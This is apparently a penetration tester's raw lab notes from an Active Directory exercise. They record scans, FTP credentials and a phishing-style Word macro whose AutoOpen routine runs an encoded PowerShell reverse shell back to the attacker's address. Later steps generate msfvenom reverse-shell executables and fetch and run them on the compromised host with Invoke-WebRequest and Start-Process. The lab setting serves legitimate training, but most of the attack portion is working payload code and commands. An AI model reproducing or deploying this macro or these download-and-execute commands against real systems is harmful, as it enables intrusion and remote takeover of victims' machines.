```
20:21

#nmap for each respective machine found in files.
```


```shell
# ping to ensure that AD is up.
20:23
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.20   
PING 10.11.1.20 (10.11.1.20) 56(84) bytes of data.
64 bytes from 10.11.1.20: icmp_seq=1 ttl=126 time=56.4 ms
64 bytes from 10.11.1.20: icmp_seq=2 ttl=126 time=59.5 ms
^C
--- 10.11.1.20 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 56.414/57.961/59.508/1.547 ms
                                                                                
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.21
PING 10.11.1.21 (10.11.1.21) 56(84) bytes of data.
64 bytes from 10.11.1.21: icmp_seq=1 ttl=126 time=57.3 ms
64 bytes from 10.11.1.21: icmp_seq=2 ttl=126 time=56.8 ms
^C
--- 10.11.1.21 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 56.777/57.040/57.303/0.263 ms
                                                                                
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.22
PING 10.11.1.22 (10.11.1.22) 56(84) bytes of data.
64 bytes from 10.11.1.22: icmp_seq=1 ttl=126 time=57.2 ms
64 bytes from 10.11.1.22: icmp_seq=2 ttl=126 time=66.5 ms
^C
--- 10.11.1.22 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 57.222/61.877/66.532/4.655 ms
                                                                                
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.23
PING 10.11.1.23 (10.11.1.23) 56(84) bytes of data.
^C
--- 10.11.1.23 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1023ms

                                                                                
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.24
PING 10.11.1.24 (10.11.1.24) 56(84) bytes of data.
64 bytes from 10.11.1.24: icmp_seq=1 ttl=126 time=57.5 ms
64 bytes from 10.11.1.24: icmp_seq=2 ttl=126 time=65.9 ms
^C
--- 10.11.1.24 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 57.529/61.736/65.944/4.207 ms

```


```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.11.1.20-24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 21:23 EST
Nmap scan report for 10.11.1.20
Host is up (0.061s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-01 02:23:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: svcorp.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: svcorp.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-03-01T02:24:25+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: svcorp
|   NetBIOS_Domain_Name: svcorp
|   NetBIOS_Computer_Name: SV-DC01
|   DNS_Domain_Name: svcorp.com
|   DNS_Computer_Name: sv-dc01.svcorp.com
|   DNS_Tree_Name: svcorp.com
|   Product_Version: 10.0.17763
|_  System_Time: 2023-03-01T02:23:52+00:00
| ssl-cert: Subject: commonName=sv-dc01.svcorp.com
| Not valid before: 2023-02-27T20:20:13
|_Not valid after:  2023-08-29T20:20:13
Service Info: Host: SV-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-01T02:23:56
|_  start_date: N/A

Nmap scan report for 10.11.1.21
Host is up (0.062s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: SV Corporation Editorial Process
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: svcorp
|   NetBIOS_Domain_Name: svcorp
|   NetBIOS_Computer_Name: SV-FILE01
|   DNS_Domain_Name: svcorp.com
|   DNS_Computer_Name: sv-file01.svcorp.com
|   DNS_Tree_Name: svcorp.com
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-01T02:23:53+00:00
|_ssl-date: 2023-03-01T02:24:25+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sv-file01.svcorp.com
| Not valid before: 2023-02-27T20:20:38
|_Not valid after:  2023-08-29T20:20:38
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-01T02:24:01
|_  start_date: 2022-03-24T22:59:18

Nmap scan report for 10.11.1.22
Host is up (0.062s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 10 Pro N 14393 microsoft-ds (workgroup: svcorp)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-03-01T02:24:25+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=svclient08.svcorp.com
| Not valid before: 2023-02-27T20:20:41
|_Not valid after:  2023-08-29T20:20:41
| rdp-ntlm-info: 
|   Target_Name: svcorp
|   NetBIOS_Domain_Name: svcorp
|   NetBIOS_Computer_Name: SVCLIENT08
|   DNS_Domain_Name: svcorp.com
|   DNS_Computer_Name: svclient08.svcorp.com
|   DNS_Tree_Name: svcorp.com
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-01T02:23:53+00:00
Service Info: Host: SVCLIENT08; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 5s, median: -1s
| smb2-time: 
|   date: 2023-03-01T02:24:02
|_  start_date: 2021-11-28T18:40:16
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro N 14393 (Windows 10 Pro N 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: svclient08
|   NetBIOS computer name: SVCLIENT08\x00
|   Domain name: svcorp.com
|   Forest name: svcorp.com
|   FQDN: svclient08.svcorp.com
|_  System time: 2023-03-01T02:24:04+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap scan report for 10.11.1.23
Host is up.
All 1000 scanned ports on 10.11.1.23 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap scan report for 10.11.1.24
Host is up (0.061s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 10 Pro N 14393 microsoft-ds (workgroup: svcorp)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-03-01T02:24:25+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: svcorp
|   NetBIOS_Domain_Name: svcorp
|   NetBIOS_Computer_Name: SVCLIENT73
|   DNS_Domain_Name: svcorp.com
|   DNS_Computer_Name: svclient73.svcorp.com
|   DNS_Tree_Name: svcorp.com
|   Product_Version: 10.0.14393
|_  System_Time: 2023-03-01T02:23:52+00:00
| ssl-cert: Subject: commonName=svclient73.svcorp.com
| Not valid before: 2023-02-27T20:22:10
|_Not valid after:  2023-08-29T20:22:10
Service Info: Host: SVCLIENT73; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-01T02:24:10
|_  start_date: 2022-02-05T04:37:18
|_clock-skew: mean: 2s, deviation: 7s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Pro N 14393 (Windows 10 Pro N 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: svclient73
|   NetBIOS computer name: SVCLIENT73\x00
|   Domain name: svcorp.com
|   Forest name: svcorp.com
|   FQDN: svclient73.svcorp.com
|_  System time: 2023-03-01T02:24:09+00:00

Post-scan script results:
| clock-skew: 
|   2s: 
|     10.11.1.24
|     10.11.1.22
|     10.11.1.21
|_    10.11.1.20
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 5 IP addresses (5 hosts up) scanned in 59.82 seconds

```

```shell
20:30
# starting at the .21 considering there is a webserver
Nmap scan report for 10.11.1.21
Host is up (0.062s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http          Microsoft IIS httpd 10.0

# refer to image 1 for what was shown
```

```shell
# ftp creds ftp creds ftp creds ftp creds ftp creds
ftp server credentials: editor:MyEditWork
```


![[2 ftp file transfer test.png]]

```
20:32
# successfully transferred file to ftp server, however keep note that the file gets deleted every few minutes - potentially getting executed and deleted.

# image 1 states that the editors are opening the file so we are able to make a macro that allows 
```

![[2.1 ftp file deleted after 5 mins.png]]



```shell

20:41

# creating new macro to get initial access again to practice.
# new ip address
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 192.168.45.238  netmask 255.255.255.0  destination 192.168.45.238
        inet6 fe80::6425:c44f:6714:5a8b  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 4969  bytes 288227 (281.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7315  bytes 365613 (357.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```

```
# new macro - used image 1 as referance in AD set screenshots p2

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
	Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
	Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
	Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
	Str = Str + "MQA5ADIALgAxADYAOAAuADQANQAuADIAMwA4ACIALAAxADIAMw"
	Str = Str + "A0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
	Str = Str + "AHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AG"
	Str = Str + "UAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA"
	Str = Str + "MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQ"
	Str = Str + "AgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABl"
	Str = Str + "AHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AG"
	Str = Str + "gAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0A"
	Str = Str + "IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATg"
	Str = Str + "BhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBD"
	Str = Str + "AEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAG"
	Str = Str + "kAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQA"
	Str = Str + "cwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQ"
	Str = Str + "B0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBu"
	Str = Str + "AGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAH"
	Str = Str + "MAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAA"
	Str = Str + "KABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJA"
	Str = Str + "BzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBl"
	Str = Str + "AG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAG"
	Str = Str + "UAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkA"
	Str = Str + "OwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbg"
	Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
	Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
	Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
	Str = Str + "KAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

```shell
# make sure to setup listener & double/ triple/ quadruple check revshells.com ip address.
nc -lvnp 1234
```

![[1 new & old macro as reference.png]]


![[2 new new new macro.png]]


```
20:57
# saved newnewnew.doc macro onto desktop of windows host machine.
```

![[3 newnewnew.doc.png]]



```shell
# started ssh service on kali machine
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# service ssh start    

# note that it could not open the file originally because the file was still open
C:\Users\jorde\OneDrive\Desktop>pscp newnewnew.doc root@192.168.128.129:"/home/kali/Documents/www/newnewnew.doc"
root@192.168.128.129's password:
pscp: newnewnew.doc: Cannot open file

# successful anddisplays the 100% file transfer within the /home/kali/Documents/www
C:\Users\jorde\OneDrive\Desktop>pscp newnewnew.doc root@192.168.128.129:"/home/kali/Documents/www/newnewnew.doc"
root@192.168.128.129's password:
newnewnew.doc             | 32 kB |  32.5 kB/s | ETA: 00:00:00 | 100%

C:\Users\jorde\OneDrive\Desktop>
```

```shell
21:04
# double checking to ensure that the file was correctly uploaded

┌──(root㉿kali)-[/home/kali/Documents/www]
└─# ls -la | grep newnewnew
-rw-r--r-- 1 root root   33280 Feb 28 22:02 newnewnew.doc

```

```shell
# transferred file newnewnew.doc macro over to ftp server, now monitoring reverse shell callback.
21:05

┌──(root㉿kali)-[/home/kali/Documents/www]
└─# ftp 10.11.1.21
Connected to 10.11.1.21.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.11.1.21:kali): editor 
331 Password required for editor
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put newnewnew.doc
local: newnewnew.doc remote: newnewnew.doc
229 Entering Extended Passive Mode (|||60714|)
150 Opening data channel for file upload to server of "/newnewnew.doc"
100% |************************************************************************************************************************************************************************************************| 33280      236.81 KiB/s    00:00 ETA
226 Successfully transferred "/newnewnew.doc"
33280 bytes sent in 00:00 (144.40 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||57629|)
150 Opening data channel for directory listing of "/"
-rw-r--r-- 1 ftp ftp          33280 Feb 28 19:05 newnewnew.doc
226 Successfully transferred "/"

```

![[4 ftp newnewnew.doc xfer.png]]


```shell
# the reverse shell did not work, uploading again and going to wait to see if it catches this time

# checked olevba to ensure that the macro is indeeed working and it is.

┌──(root㉿kali)-[/home/kali/Documents/www]
└─# olevba newnewnew.doc
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools
===============================================================================
FILE: newnewnew.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: newnewnew.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: newnewnew.doc - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
    Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
    Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
    Str = Str + "MQA5ADIALgAxADYAOAAuADQANQAuADIAMwA4ACIALAAxADIAMw"
    Str = Str + "A0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
    Str = Str + "AHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AG"
    Str = Str + "UAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUA"
    Str = Str + "MwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQ"
    Str = Str + "AgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABl"
    Str = Str + "AHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AG"
    Str = Str + "gAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0A"
    Str = Str + "IAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATg"
    Str = Str + "BhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBD"
    Str = Str + "AEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAG"
    Str = Str + "kAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQA"
    Str = Str + "cwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQ"
    Str = Str + "B0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBu"
    Str = Str + "AGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAH"
    Str = Str + "MAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAA"
    Str = Str + "KABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJA"
    Str = Str + "BzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBl"
    Str = Str + "AG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAG"
    Str = Str + "UAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkA"
    Str = Str + "OwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbg"
    Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
    Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
    Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
    Str = Str + "KAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)     
```


```shell

# on as alice, box needed to be reverted and macro worked perfect!
# refer to image 5

```

![[5 on as alice.png]]


```powershell
21:23
# commencing enumeration
# new users
PS C:\> cd Users
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       07/03/2019     22:02                Administrator                                                         
d-----       01/03/2023     03:16                alice                                                                 
d-----       04/03/2019     13:24                defaultuser0                                                          
d-----       04/03/2019     13:32                offsec                                                                
d-r---       01/03/2023     03:16                Public                                                                
d-----       07/03/2019     21:50                tris

#proof.txt
PS C:\Users\Administrator\Desktop> type proof.txt
464a734cfa6ca2188ffaaa902f144bce

# systeminfo
464a734cfa6ca2188ffaaa902f144bce
PS C:\Users\Administrator\Desktop> systeminfo

Host Name:                 SVCLIENT08
OS Name:                   Microsoft Windows 10 Pro N
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00331-60000-00000-AA584
Original Install Date:     04/03/2019, 13:27:02
System Boot Time:          28/11/2021, 18:40:08
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,398 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,657 MB
Virtual Memory: In Use:    1,030 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    svcorp.com
Logon Server:              \\SV-DC01
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.11.1.22
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

# whoami /priv
PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

#netstat -ano

PS C:\Users\Administrator\Desktop> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       844
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       440
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1496
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       540
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       532
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1396
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       540
  TCP    10.11.1.22:139         0.0.0.0:0              LISTENING       4
  TCP    10.11.1.22:49725       192.168.119.147:4443   ESTABLISHED     3840
  TCP    10.11.1.22:49726       192.168.119.147:4443   CLOSE_WAIT      1828
  TCP    10.11.1.22:49729       192.168.119.147:4443   ESTABLISHED     4880
  TCP    10.11.1.22:49730       10.11.1.21:445         ESTABLISHED     4
  TCP    10.11.1.22:49731       192.168.45.238:1234    ESTABLISHED     4056
  TCP    10.11.1.22:49737       10.11.1.20:135         TIME_WAIT       0
  TCP    10.11.1.22:49738       10.11.1.20:49667       TIME_WAIT       0
  TCP    10.11.1.22:49739       10.11.1.20:135         TIME_WAIT       0
  TCP    10.11.1.22:49740       10.11.1.20:49667       TIME_WAIT       0
  TCP    [::]:135               [::]:0                 LISTENING       668
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       844
  TCP    [::]:7680              [::]:0                 LISTENING       836
  TCP    [::]:49664             [::]:0                 LISTENING       440
  TCP    [::]:49665             [::]:0                 LISTENING       916
  TCP    [::]:49666             [::]:0                 LISTENING       836
  TCP    [::]:49667             [::]:0                 LISTENING       1496
  TCP    [::]:49668             [::]:0                 LISTENING       540
  TCP    [::]:49669             [::]:0                 LISTENING       532
  TCP    [::]:49670             [::]:0                 LISTENING       1396
  TCP    [::]:49671             [::]:0                 LISTENING       540
  UDP    0.0.0.0:123            *:*                                    876
  UDP    0.0.0.0:500            *:*                                    836
  UDP    0.0.0.0:3389           *:*                                    844
  UDP    0.0.0.0:4500           *:*                                    836
  UDP    0.0.0.0:5050           *:*                                    876
  UDP    0.0.0.0:5353           *:*                                    844
  UDP    0.0.0.0:5355           *:*                                    844
  UDP    0.0.0.0:55634          *:*                                    844
  UDP    10.11.1.22:137         *:*                                    4
  UDP    10.11.1.22:138         *:*                                    4
  UDP    10.11.1.22:1900        *:*                                    3956
  UDP    10.11.1.22:53283       *:*                                    3956
  UDP    127.0.0.1:1900         *:*                                    3956
  UDP    127.0.0.1:53284        *:*                                    3956
  UDP    127.0.0.1:56750        *:*                                    836
  UDP    127.0.0.1:56969        *:*                                    540
  UDP    127.0.0.1:63801        *:*                                    844
  UDP    [::]:123               *:*                                    876
  UDP    [::]:500               *:*                                    836
  UDP    [::]:3389              *:*                                    844
  UDP    [::]:4500              *:*                                    836
  UDP    [::]:55634             *:*                                    844
  UDP    [::1]:1900             *:*                                    3956
  UDP    [::1]:53282            *:*                                    3956


```


```shell
21:25
# breaking into msfvenom shell for better compatibility
┌──(root㉿kali)-[/home/kali/Documents/www]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=139 EXITFUNC=thread -f exe -o /home/kali/Documents/www/shell_139.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /home/kali/Documents/www/shell_139.exe
```

```powershell
21:30
# made a working directory

PS C:\windows> mkdir tasks
PS C:\windows> cd tasks
PS C:\windows\tasks> dir


```

```powershell
# make sure to change ip to whatever tun0 is
21:29

# did not work
iwr -uri 192.168.45.238 -OutFile /home/kali/Documents/www/shell_139.exe

# moving shell_139.exe from /home/kali/Documents/www to /home kali
┌──(root㉿kali)-[/home/kali/Documents/www]
└─# cp shell_139.exe /home/kali/

# did not work originally because I forgot to host web server...
# HOST WEBSERVER HOST WEBSERVER HOST WEBSERVER

# trying new command - was transferred but did not work right going to try to upload a different port.
iwr -uri 192.168.45.238 -OutFile shell_139.exe

```

![[6 successful msfvenom shell xfer.png]]



```shell
# trying different port
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4545 EXITFUNC=thread -f exe -o /home/kali/shell_4545.exe

# powershell that invokes the shell.exe msfvenom payload ( essentially a wget) as well as outputs it into C:\Windows\Tasks\shell.exe
# refer to image 13

Invoke-WebRequest -Uri http://192.168.45.238 -OutFile C:\Windows\tasks\shell.exe;Start-Process -NoNewWindows - FilePath C:\Windows\Tasks\shell.exe

#shell failed again with this command to start it
PS C:\windows\tasks> Start-Process -NoNewWindows - FilePath C:\Windows\Tasks\shell.exe
PS C:\windows\tasks> powershell -ep bypass

# going to re evaluate netstat to see what ports are already listening and create a new shell.

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.238 LPORT=7680 EXITFUNC=thread -f exe -o /home/kali/shell_7680.exe

# did not work did not work
Invoke-WebRequest -Uri http://192.168.45.238 -OutFile C:\Windows\tasks\shell_7680.exe;Start-Process -NoNewWindows - FilePath C:\Windows\Tasks\shell_7680.exe

